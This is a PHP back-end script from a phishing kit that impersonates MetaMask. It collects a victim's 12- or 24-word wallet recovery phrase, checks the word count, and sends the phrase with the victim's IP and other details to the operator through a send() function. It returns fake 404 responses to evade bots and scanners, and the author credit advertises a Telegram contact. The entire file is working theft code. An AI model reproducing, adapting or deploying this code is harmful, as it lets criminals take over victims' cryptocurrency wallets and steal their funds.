<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/ELP4SSW0RD
    ********************************************************/

    require_once 'app/config.php';

    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if ($_POST['steeep'] == "words") {
            $_SESSION['errors']      = [];
            $_SESSION['example']   = $_POST['example'];
            $explode = explode(',',$_POST['example']);
            if( count($explode) !== 12 && count($explode) !== 24 ) {
                $_SESSION['errors']['example'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | METAMASK | Words';
                $message = '/-- WORDS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Words : ' . $_POST['example'] . "\r\n";
                $message .= '/-- END WORDS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "../index.php?redirection=success";
                exit();
            } else {
                echo "../index.php?redirection=words&error=1";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>